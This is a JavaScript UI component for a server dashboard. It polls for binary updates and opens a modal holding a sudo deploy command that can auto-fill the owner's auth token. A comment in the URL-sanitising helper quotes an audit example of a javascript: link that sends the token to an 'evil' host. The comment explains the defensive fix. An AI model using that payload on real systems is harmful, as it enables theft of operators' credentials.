/*
 * Copyright (C) 2026-present Elacity
 * SPDX-License-Identifier: AGPL-3.0
 *
 * components/tools-update-card.js — read-only "binary update available" card.
 *
 * Lives at the bottom of the Status pane (alpha.9+; the Tools sub-tab was
 * dropped). Fetches /api/enm/updates/available on mount + 6h interval.
 * Three resting states:
 *
 *   no data yet              — skeleton "Checking for updates…"
 *   up-to-date (current ===  — single line "On the latest release (vX.Y.Z)"
 *     latest)
 *   update available         — full card: current vs latest, severity chip,
 *                              release-notes excerpt, "Update via shell"
 *                              button that opens the deploy-command modal.
 *
 * Beta 3 rewrite: the modal opened by the "Update via shell" button
 * now uses the shared phase-06 .enm-modal-scrim + .enm-modal-card chrome
 * with the body shape laid out in the user spec (heading → summary →
 * deploy command <pre> → actions row of Copy + Close). Resting card
 * structure is unchanged from alpha.28 — BP-B Settings owns the
 * card-on-tab styling.
 *
 * Cross-tab indicator: writes `data-update-severity` on document.body
 * whenever the envelope changes; the global CSS hangs a dot off the
 * Status nav button (technical-view.js owns the markup; this component
 * owns the *data*).
 */

(function (root) {
    'use strict';

    var REFRESH_MS = 6 * 60 * 60 * 1000;

    function EnmToolsUpdateCard(opts) {
        if (!opts || !opts.api) {
            throw new TypeError('EnmToolsUpdateCard: { api } required');
        }
        this.api = opts.api;
        this.notifications = opts.notifications || null;

        this.root = document.createElement('section');
        this.root.className = 'enm-card enm-tools-update-card';
        this.root.innerHTML =
            '<header class="enm-tools-update-head">'
            + '<h3>Binary update</h3>'
            + '<p class="enm-stub" style="margin:0;text-align:left;padding:0">'
            + 'Checking GitHub for newer ela releases…'
            + '</p>'
            + '</header>';
        this._timer = null;
        // alpha.28.1 batch 24 — _destroyed flag. refresh() fires a fire-
        // and-forget /updates/available that previously wrote
        // document.body.dataset.updateSeverity even AFTER teardown,
        // re-lighting the cross-tab severity dot on a torn-down view.
        // (Lifecycle audit aff18c172.)
        this._destroyed = false;
    }

    EnmToolsUpdateCard.prototype.mount = function (parent) {
        parent.appendChild(this.root);
        this.refresh();
        var self = this;
        this._timer = setInterval(function () { self.refresh(); }, REFRESH_MS);
        // alpha.28.1 batch 74 (Round-20A audit finding #5) — re-run
        // relTime on the "Last checked" + "released" spans every 60s.
        // The card only re-renders on the 6h REFRESH_MS interval, so
        // the visible string was frozen for up to 6 hours of clock time.
        // Operator returns to the Status tab 90 minutes later and still
        // sees "Last checked 5 min ago" — implying a fresh probe that
        // did not happen.
        //
        // alpha.28.1 batch 75 (Round-21 regression) — the original tick
        // wrote `spans[i].textContent = relTime(ts)`, but relTime
        // returns trusted HTML (`<time datetime=... title=...>X min
        // ago</time>`). Assigning that to textContent rendered the
        // raw markup as visible text. The right shape is to update
        // only the inner <time> element's text via enmFormatDate's
        // relative mode (the human substring), leaving the surrounding
        // <time datetime + title> static — datetime represents WHEN
        // the check happened, not when it was last rendered, so it
        // is correctly stable.
        this._relTimer = setInterval(function () {
            if (self._destroyed) { return; }
            var spans = self.root.querySelectorAll('.enm-tools-update-reltime');
            for (var i = 0; i < spans.length; i += 1) {
                var ts = Number(spans[i].dataset.ts);
                if (!isFinite(ts)) { continue; }
                var timeEl = spans[i].querySelector('time');
                var human = (typeof root !== 'undefined' && root.enmFormatDate)
                    ? root.enmFormatDate(ts, { mode: 'relative' })
                    : 'recently';
                if (timeEl) {
                    timeEl.textContent = human;
                } else {
                    // <time> missing (older render path or relTime
                    // fell back to its catch branch). Update the span
                    // directly with textContent — losing the <time>
                    // wrap but keeping a readable value.
                    spans[i].textContent = human;
                }
            }
        }, 60_000);
        return this;
    };

    EnmToolsUpdateCard.prototype.destroy = function () {
        this._destroyed = true;
        if (this._timer) { clearInterval(this._timer); this._timer = null; }
        if (this._relTimer) { clearInterval(this._relTimer); this._relTimer = null; }
        // Close any open update-shell modal so its document-level keydown
        // listener doesn't leak across an app reinstall. _modalClose is
        // wired by _openUpdateModal whenever the modal is open.
        if (typeof this._modalClose === 'function') {
            try { this._modalClose(); } catch (e) { /* ignore */ }
            this._modalClose = null;
        }
        if (this.root.parentNode) this.root.parentNode.removeChild(this.root);
    };

    EnmToolsUpdateCard.prototype.refresh = function (opts) {
        var self = this;
        var query = (opts && opts.force) ? '?refresh=1' : '';
        return this.api.get('/updates/available' + query, { skipCache: true }).then(function (env) {
            if (self._destroyed) { return; }
            self._render(env);
            // Surface the cross-tab severity dot via body data attribute.
            // technical-view.js reads this to colour the Status tab nav button.
            if (env && env.updateAvailable && env.severity) {
                document.body.dataset.updateSeverity = env.severity;
            } else {
                delete document.body.dataset.updateSeverity;
            }
        }).catch(function () {
            if (self._destroyed) { return; }
            self._renderError();
            delete document.body.dataset.updateSeverity;
        });
    };

    /** @private */
    EnmToolsUpdateCard.prototype._render = function (env) {
        if (!env) { this._renderError(); return; }
        // 0.2.0-alpha.9 — surface offline-mode + fallback source so the
        // operator knows when the version comparison is build-time stale
        // vs a fresh GitHub probe.
        // alpha.28.1 batch 81 — strings sourced from strings.js
        // tools_update.* so locale switching covers the resting card.
        var t = root.enmTOrFallback;
        var isFallback = env.source === 'fallback';
        var isStale = env.status === 'stale';
        var sourceBadge = isFallback
            ? ' <span class="enm-tools-update-badge" title="' + escapeAttr(t('tools_update.badge_offline_title')) + '">' + escapeHtml(t('tools_update.badge_offline')) + '</span>'
            : (isStale ? ' <span class="enm-tools-update-badge enm-tools-update-badge-stale" title="' + escapeAttr(t('tools_update.badge_stale_title')) + '">' + escapeHtml(t('tools_update.badge_stale')) + '</span>' : '');

        if (!env.updateAvailable) {
            this.root.dataset.severity = 'none';
            // Build the version + optional Last-checked clause. The
            // relTime() output is trusted HTML (<time> wrapper); the
            // strings.js template uses {version} + {time} placeholders
            // so we can fill them at the call site after the locale
            // string is resolved.
            var versionTag = '<code>' + escapeHtml(env.current || 'unknown') + '</code>';
            var statusLine;
            if (env.lastCheckedAt) {
                var timeTag = '<span class="enm-tools-update-reltime" data-ts="'
                    + env.lastCheckedAt + '">' + relTime(env.lastCheckedAt) + '</span>';
                statusLine = t('tools_update.latest_release_with_check', {
                    version: versionTag,
                    time: timeTag,
                });
            } else {
                statusLine = t('tools_update.latest_release_one', { version: versionTag });
            }
            this.root.innerHTML =
                '<header class="enm-tools-update-head">'
                +   '<h3>' + escapeHtml(t('tools_update.head_resting')) + sourceBadge + '</h3>'
                +   '<p class="enm-stub" style="margin:0;text-align:left;padding:0">'
                +     statusLine
                +     (isFallback
                        ? '<br><span style="font-size:12px;color:var(--text-muted)">'
                          + t('tools_update.fallback_explainer')
                          + '</span>'
                        : '')
                +   '</p>'
                + '</header>';
            return;
        }
        // Update is available.
        this.root.dataset.severity = env.severity || 'minor';
        var severityChip =
            '<span class="enm-tools-update-chip enm-tools-update-chip-' + escapeAttr(env.severity || 'minor') + '">'
            + escapeHtml(severityLabel(env.severity))
            + '</span>';
        var notes = env.releaseNotes
            ? '<details class="enm-tools-update-notes">'
              + '<summary>' + escapeHtml(t('tools_update.notes_summary')) + '</summary>'
              + '<pre>' + escapeHtml(env.releaseNotes) + '</pre>'
              + (env.htmlUrl
                ? '<a href="' + escapeAttr(safeExternalUrl(env.htmlUrl)) + '" target="_blank" rel="noopener noreferrer">' + escapeHtml(t('tools_update.open_on_github')) + '</a>'
                : '')
              + '</details>'
            : '';
        // 0.2.0-alpha.10 — update command is no longer rendered inline.
        // A button opens a modal with the exact command, copy-to-clipboard,
        // and the audit/security boilerplate. Two reasons: (1) the inline
        // <pre> showed the operator's token as a literal "<token>"
        // placeholder which confused at least one operator, (2) modal
        // gives us room for the "what this actually does" explainer
        // without bloating the resting card.
        // Apply-in-place (real "Update now" with preflight + rollback)
        // lands in alpha.11+; this release is the UX shortcut.
        var versionsLine = t('tools_update.versions_line', {
            current: '<code>' + escapeHtml(env.current || 'unknown') + '</code> <span aria-hidden="true">→</span>',
            latest:  '<code>' + escapeHtml(env.latest) + '</code>',
        });
        var releasedWhen = '';
        if (env.publishedAt) {
            var pTime = '<span class="enm-tools-update-reltime" data-ts="'
                + Date.parse(env.publishedAt) + '">' + relTime(Date.parse(env.publishedAt)) + '</span>';
            releasedWhen = ' <span class="enm-tools-update-when">'
                + t('tools_update.released_when', { time: pTime })
                + '</span>';
        }
        this.root.innerHTML =
            '<header class="enm-tools-update-head">'
            +   '<div class="enm-tools-update-head-row">'
            +     '<h3>' + escapeHtml(t('tools_update.head_available')) + sourceBadge + '</h3>'
            +     severityChip
            +   '</div>'
            +   '<p class="enm-tools-update-versions">'
            +     versionsLine
            +     releasedWhen
            +   '</p>'
            + '</header>'
            + notes
            + '<div class="enm-tools-update-action">'
            +   '<button type="button" class="enm-btn enm-btn-primary enm-tools-update-btn">' + escapeHtml(t('tools_update.update_btn')) + '</button>'
            +   '<p class="enm-tools-update-action-help">'
            +     escapeHtml(t('tools_update.update_help'))
            +   '</p>'
            + '</div>';

        var self = this;
        var btn = this.root.querySelector('.enm-tools-update-btn');
        if (btn) {
            btn.addEventListener('click', function () { self._openUpdateModal(env); });
        }
    };

    /**
     * @private
     * Show a modal with the deploy command pre-filled. The token is
     * filled in only when the user clicks "Auto-fill my token" — default
     * is the placeholder so we don't display credentials by default if
     * someone screenshots the card.
     *
     * Beta 3: the outer chrome is now the shared phase-06 modal-card
     * (.enm-modal-scrim + .enm-modal-card). Body shape per the user
     * spec for tools-update:
     *
     *   .enm-modal-heading   — "Update to vX.Y.Z"
     *   .enm-modal-summary   — short description
     *   pre.enm-modal-cmd    — terminal-bg deploy command block
     *   .enm-modal-actions   — Copy command (primary) + Close (secondary)
     *
     * The release-notes/explainer disclosure stays as a <details> below
     * the actions row so the operator can drill in without bloating the
     * default view.
     */
    EnmToolsUpdateCard.prototype._openUpdateModal = function (env) {
        // alpha.28.1 bug fix (batches 7/8 referenced `self` inside this
        // function but never declared it — `self === window` in browsers
        // silently swallowed the destroy-hook leak fix). Aliasing here so
        // the entire function honours `this` (the card instance) as the
        // rest of the file already does.
        var self = this;
        // Race-conditions audit aaf1f87d, finding B12 — rapid re-clicks
        // on the "View command" trigger previously did `removeChild` on
        // the pre-existing modal node but never called the prior modal's
        // `close()`, so the document-level keydown + Tab-trap listeners
        // attached at lines below leaked one pair per re-open. Calling
        // _modalClose first (the close() hook stored by the previous
        // open) removes both listeners and restores focus to whatever
        // had it before the FIRST open. If there is no prior modal,
        // _modalClose is null and the cleanup is a no-op.
        if (typeof this._modalClose === 'function') {
            try { this._modalClose(); } catch (e) { /* prior modal already torn down */ }
            this._modalClose = null;
        }
        var prev = document.querySelector('.enm-tools-update-modal-root');
        if (prev) prev.parentNode.removeChild(prev);

        // alpha.28.1 batch 82 — modal strings sourced from strings.js
        // tools_update.modal_*. Placeholders ({version}, {githubLink})
        // carry trusted markup so localisation can re-arrange surrounding
        // prose without breaking the version chip or the external link.
        var t = root.enmTOrFallback;
        var versionTag = '<code>' + escapeHtml(env.latest) + '</code>';
        var notesHtml = '';
        if (env.htmlUrl) {
            var link = '<a href="' + escapeAttr(safeExternalUrl(env.htmlUrl))
                + '" target="_blank" rel="noopener noreferrer">'
                + escapeHtml(env.htmlUrl) + '</a>';
            notesHtml = '<p>' + t('tools_update.modal_release_notes', { githubLink: link }) + '</p>';
        }

        // Root wrapper holds the scrim + card as siblings so the scrim
        // can swallow clicks for click-to-close without proxying through
        // the card. Class name kept on the wrapper so the proposal-card
        // Esc handler can see this modal as a topmost overlay.
        var modalRoot = document.createElement('div');
        modalRoot.className = 'enm-tools-update-modal-root';

        var scrim = document.createElement('div');
        scrim.className = 'enm-modal-scrim';
        modalRoot.appendChild(scrim);

        var card = document.createElement('div');
        card.className = 'enm-modal-card enm-tools-update-modal-card';
        card.setAttribute('role', 'dialog');
        card.setAttribute('aria-labelledby', 'upd-mod-h');
        card.setAttribute('aria-modal', 'true');
        card.innerHTML =
            '<button type="button" class="enm-tools-update-modal-close" aria-label="' + escapeAttr(t('tools_update.modal_close_aria')) + '">×</button>'
            + '<h2 id="upd-mod-h" class="enm-modal-heading">' + t('tools_update.modal_heading', { version: versionTag }) + '</h2>'
            + '<p class="enm-modal-summary">' + escapeHtml(t('tools_update.modal_lead')) + '</p>'
            + '<pre class="enm-modal-cmd">'
            +   'sudo PC2_OWNER_TOKEN=<span class="upd-tok-slot">&lt;your-token&gt;</span> /root/deploy-enm.sh enm-' + escapeHtml(env.latest)
            + '</pre>'
            + '<div class="enm-modal-actions">'
            +   '<span class="upd-copy-slot"></span>'
            +   '<button type="button" class="enm-btn enm-tools-update-modal-fill upd-fill-token">' + escapeHtml(t('tools_update.modal_auto_fill_btn')) + '</button>'
            +   '<button type="button" class="enm-btn enm-tools-update-modal-dismiss">' + escapeHtml(t('common.close') || 'Close') + '</button>'
            + '</div>'
            + '<details class="enm-tools-update-modal-notes">'
            +   '<summary>' + escapeHtml(t('tools_update.modal_explainer_label')) + '</summary>'
            +   '<ul>'
            +     '<li>' + t('tools_update.modal_step_download', { version: versionTag }) + '</li>'
            +     '<li>' + t('tools_update.modal_step_uninstall') + '</li>'
            +     '<li>' + escapeHtml(t('tools_update.modal_step_reinstall')) + '</li>'
            +     '<li>' + escapeHtml(t('tools_update.modal_step_healthcheck')) + '</li>'
            +   '</ul>'
            +   notesHtml
            + '</details>';
        modalRoot.appendChild(card);

        document.body.appendChild(modalRoot);

        // Capture focus return target + install focus trap so Tab can't
        // escape onto the chain card behind the scrim. Mirrors the
        // proposal-card + settings-drawer pattern.
        var previousFocus = document.activeElement;
        // alpha.28.1 batch 24 — guard against firing notifications on a
        // destroyed card. modalSelf is captured at open time so the close
        // hook can still drop the destroy-reference even if the card was
        // torn down while the modal was open.
        var cardSelf = self;
        // _closed flag scoped to this modal instance so .then() chains
        // from the Copy button (resolved later) can skip work if the
        // modal closed in the meantime. Mirrors the proposal-card batch
        // 93 _closed pattern.
        var modalClosed = false;

        var close = function () {
            if (modalClosed) { return; }
            modalClosed = true;
            if (modalRoot.parentNode) modalRoot.parentNode.removeChild(modalRoot);
            document.removeEventListener('keydown', onEsc);
            document.removeEventListener('keydown', trapHandler, true);
            scrim.removeEventListener('click', onScrim);
            try {
                if (previousFocus && typeof previousFocus.focus === 'function') {
                    previousFocus.focus({ preventScroll: true });
                }
            } catch (e) { /* focus may fail in detached states */ }
            // Drop the destroy-hook reference so a second destroy is a no-op.
            if (cardSelf) { cardSelf._modalClose = null; }
        };
        var onEsc = function (e) { if (e.key === 'Escape') close(); };
        document.addEventListener('keydown', onEsc);
        // Click-the-scrim closes; filter on event.target so intra-card
        // clicks don't bubble up and close.
        var onScrim = function (ev) { if (ev.target === scrim) close(); };
        scrim.addEventListener('click', onScrim);
        var trapHandler = function (ev) {
            if (ev.key !== 'Tab') { return; }
            var focusables = card.querySelectorAll(
                'a[href], button:not([disabled]), textarea:not([disabled]), ' +
                'input:not([disabled]), select:not([disabled]), [tabindex]:not([tabindex="-1"])'
            );
            if (!focusables.length) { return; }
            var first = focusables[0];
            var last  = focusables[focusables.length - 1];
            if (ev.shiftKey && document.activeElement === first) {
                ev.preventDefault();
                last.focus();
            } else if (!ev.shiftKey && document.activeElement === last) {
                ev.preventDefault();
                first.focus();
            }
        };
        document.addEventListener('keydown', trapHandler, true);

        // Expose for the card-level destroy() so the listener can't leak
        // if the operator navigates away while the modal is open.
        cardSelf._modalClose = close;

        // Move focus inside the modal once it mounts so screen readers
        // announce the new region and keyboard users land on a useful
        // control. Prefer the Copy button (primary action); fall back to
        // the auto-fill, then the close X.
        try {
            var firstFocus = card.querySelector('.upd-copy')
                || card.querySelector('.upd-fill-token')
                || card.querySelector('.enm-tools-update-modal-close');
            if (firstFocus) { firstFocus.focus({ preventScroll: true }); }
        } catch (e) { /* ignore */ }

        card.querySelector('.enm-tools-update-modal-close').addEventListener('click', close);
        var dismissBtn = card.querySelector('.enm-tools-update-modal-dismiss');
        if (dismissBtn) { dismissBtn.addEventListener('click', close); }

        card.querySelector('.upd-fill-token').addEventListener('click', function () {
            // The owner token lives on the URL's puter.auth.token search
            // param (PC2 standard). Read it directly so we don't ask the
            // operator to paste it.
            var params = new URLSearchParams(root.location.search || '');
            var tok = params.get('puter.auth.token');
            var slot = card.querySelector('.upd-tok-slot');
            if (tok && slot) {
                slot.textContent = tok;
                slot.style.color = 'var(--state-stalled)';
                slot.title = 'Your auth token. Treat as a credential — don\'t share screenshots.';
            } else if (slot) {
                slot.textContent = '(token not found in URL)';
            }
        });

        // alpha.29 batch 101 — copy button built via root.enmCopyButton
        // factory. The value is resolved at click time (a function) so
        // the operator's token autofill (the `.upd-fill-token` button
        // handler above) takes effect before we read the command text.
        var modalSelf = self;
        var copyBtn = root.enmCopyButton({
            value: function () {
                var pre = card.querySelector('.enm-modal-cmd');
                return pre ? pre.textContent : '';
            },
            label: t('tools_update.modal_copy_btn'),
            copiedLabel: 'Copied ✓',
            ariaLabel: t('tools_update.modal_copy_btn_aria'),
            resetMs: 1400,
            notifications: modalSelf && modalSelf.notifications,
            failTitle: 'Copy unavailable',
            failBody: 'Browser blocked clipboard access. Select the command text and press Ctrl-C (or ⌘-C on Mac).',
        });
        copyBtn.classList.remove('enm-btn-secondary');
        copyBtn.classList.add('enm-btn-primary', 'upd-copy');
        var copySlot = card.querySelector('.upd-copy-slot');
        if (copySlot && copySlot.parentNode) {
            copySlot.parentNode.replaceChild(copyBtn, copySlot);
        }
    };

    /** @private */
    EnmToolsUpdateCard.prototype._renderError = function () {
        // Only fires when /updates/available itself returned non-2xx
        // (auth failure, route error). Network-unreachable cases land
        // in the main _render path with status='fallback'/'stale'.
        this.root.dataset.severity = 'unknown';
        // v0.5.212 — added a "Check now" button so the operator isn't
        // locked into the 6-hour retry cadence after a transient failure.
        // The pre-v0.5.212 final-line "Will retry in 6 hours" was
        // operator-unfriendly: if the network or GitHub recovered 30s
        // later, there was no UI affordance to recheck — only a manual
        // page reload triggered a fresh _refresh().
        var self = this;
        this.root.innerHTML =
            '<header class="enm-tools-update-head">'
            +   '<h3>Binary update</h3>'
            +   '<p class="enm-stub" style="margin:0;text-align:left;padding:0">'
            +     'Couldn\'t check for binary updates. Will retry in 6 hours.'
            +     ' <button type="button" class="enm-link-button" data-action="updates-retry-now"'
            +     ' style="margin-left:6px;">Check now</button>'
            +   '</p>'
            + '</header>';
        var btn = this.root.querySelector('[data-action="updates-retry-now"]');
        if (btn) {
            btn.addEventListener('click', function () {
                if (self._destroyed) { return; }
                btn.disabled = true;
                btn.textContent = 'Checking…';
                self._refresh();
            });
        }
    };

    // ---- helpers ----

    function severityLabel(s) {
        if (s === 'major') return 'MAJOR';
        if (s === 'minor') return 'MINOR';
        if (s === 'patch') return 'PATCH';
        return 'UPDATE';
    }

    function escapeHtml(s) {
        return String(s == null ? '' : s).replace(/[&<>"]/g, function (c) {
            return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[c];
        });
    }
    function escapeAttr(s) {
        return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
            return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c];
        });
    }
    /**
     * Sanitise a URL before rendering it as an `<a href>`. Returns the
     * URL as-is if (a) it parses and (b) the scheme is one we trust.
     * Returns '#' (a no-op anchor) otherwise. The previous version
     * escaped the URL as HTML and called it safe; that does not prevent
     * `javascript:` schemes because they contain no HTML-special
     * characters. (Security audit aa5a9715: a compromised GitHub probe
     * response could put `javascript:fetch('https://evil/x?t=' +
     * location.search)` into env.htmlUrl and exfiltrate the owner
     * bearer token on operator click.) We restrict to https + http for
     * release-notes links — GitHub canonical is https://github.com/...
     */
    function safeExternalUrl(raw) {
        if (raw == null || raw === '') { return '#'; }
        var u;
        try { u = new URL(String(raw)); }
        catch (e) { return '#'; }
        if (u.protocol !== 'https:' && u.protocol !== 'http:') { return '#'; }
        return u.toString();
    }
    // alpha.28.1 batch 35 — migrated to enmFormatDate (batch 34 helper)
    // for the relative human label. The `<time datetime=>` wrap with
    // ISO tooltip is preserved (it's the WCAG 1.4.13-friendly tooltip
    // from batch 6); only the inner human-string generation moved to
    // the shared helper.
    function relTime(ms) {
        if (!ms || typeof ms !== 'number') { return 'recently'; }
        var human = (typeof root !== 'undefined' && root.enmFormatDate)
            ? root.enmFormatDate(ms, { mode: 'relative' })
            : 'recently';
        try {
            var iso = new Date(ms).toISOString();
            return '<time datetime="' + iso + '" title="' + iso + '">' + human + '</time>';
        } catch (e) {
            return human;
        }
    }

    root.EnmToolsUpdateCard = EnmToolsUpdateCard;
}(typeof window !== 'undefined' ? window : globalThis));
